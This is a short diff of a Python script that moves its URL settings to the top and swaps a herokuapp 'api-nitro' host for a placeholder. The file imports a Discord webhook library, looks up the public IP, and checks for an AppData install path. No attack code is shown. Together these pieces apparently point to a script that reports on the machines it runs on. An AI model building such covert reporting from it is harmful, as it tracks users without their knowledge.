@@ -1,3 +1,7 @@
+url_edit = "https://_WEBSITE_HERE_/edit-post/1"
+url_raw = "https://_WEBSITE_HERE_/posts/1"
+url_ip = "https://api.ipify.org"
+
 import requests
 from urllib.request import Request, urlopen
 from discord_webhook import DiscordWebhook, DiscordEmbed
@@ -60,10 +64,6 @@ if "AppData" in THIS_FOLDER:
 verion_server = "1.2"
 version_client = "1.3"
 version_API = "1.1"
-
-url_edit = "https://api-nitro.herokuapp.com/edit-post/1"
-url_raw = "https://api-nitro.herokuapp.com/posts/1"
-url_ip = "https://api.ipify.org"
 
 result = "None"
 
